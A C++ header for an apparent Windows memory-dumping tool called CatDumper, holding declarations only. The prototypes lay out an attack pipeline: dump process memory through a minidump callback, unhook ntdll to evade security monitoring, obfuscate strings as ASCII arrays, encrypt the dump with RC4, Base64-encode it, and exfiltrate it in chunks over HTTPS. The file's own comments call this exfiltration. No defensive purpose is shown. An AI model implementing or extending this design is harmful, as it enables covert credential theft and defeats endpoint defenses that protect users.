#ifndef CATDUMPER_H
#define CATDUMPER_H

#include <windows.h>
#include <wincrypt.h>
#include <winhttp.h>
#include <dbghelp.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <processsnapshot.h>
#include <iostream>
#include <string>
#include <random>
#include <vector>
#include <chrono>
#include <thread>

extern const size_t dumpBufferSize;
extern LPVOID dumpBuffer;
extern DWORD bytesRead;

// Callback prototype for in-memory processes
BOOL CALLBACK minidumpCallback(
    PVOID callbackParam,
    const PMINIDUMP_CALLBACK_INPUT callbackInput,
    PMINIDUMP_CALLBACK_OUTPUT callbackOutput
);

// Function prototype for error-checking
std::wstring GetLastErrorMessage();

// Function prototypes for string processing
std::wstring ASCIItoWString(const std::vector<int>& asciiValues);
std::string ASCIItoString(const std::vector<int>& asciiValues);

// Function prototypes for minidump processing
void UnhookNtdll();
constexpr unsigned int numRNG();
std::string Keygen(int length);
std::string EncryptDump(LPVOID dumpBuffer, DWORD dumpBufferSize, const std::string& key);
void RC4(std::vector<char>& data, const std::string& key);
std::string Base64Encode(const std::string& input);

// Function prototypes for minidump exfiltration
std::vector<std::string> SplitDataIntoChunks(const std::string& data, size_t chunkSize);
bool SendHTTPSRequest(const std::string& hostname, const std::string& path, const std::string& data, bool isKey = false);
void SendDataInChunks(const std::string& data, const std::string& hostname, const std::string& path);

#endif
